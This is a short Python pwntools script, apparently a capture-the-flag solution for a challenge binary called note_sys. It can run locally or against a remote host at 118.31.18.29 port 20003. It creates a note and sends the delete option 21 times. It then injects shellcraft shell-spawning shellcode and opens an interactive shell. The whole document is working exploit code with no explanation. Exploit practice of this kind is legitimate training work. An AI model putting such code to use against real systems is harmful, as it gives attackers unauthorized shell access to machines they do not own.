
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
context.arch = 'amd64'

local = 1

if local:
	cn = process('./8d3f5092-148a-47ef-b9f3-f8b9b02a9137.note_sys')
	bin = ELF('./8d3f5092-148a-47ef-b9f3-f8b9b02a9137.note_sys')
else:
	cn = remote('118.31.18.29', 20003)

def z():
	gdb.attach(cn)
	raw_input()


cn.recvuntil('choice:')
cn.sendline('0')
cn.sendline('a')

# cn.sendline('1')
# cn.recvuntil('total')


for i in range(21):
	cn.sendline('2')

cn.sendline('0')
cn.sendline(asm(shellcraft.sh()))

#z()
cn.interactive()
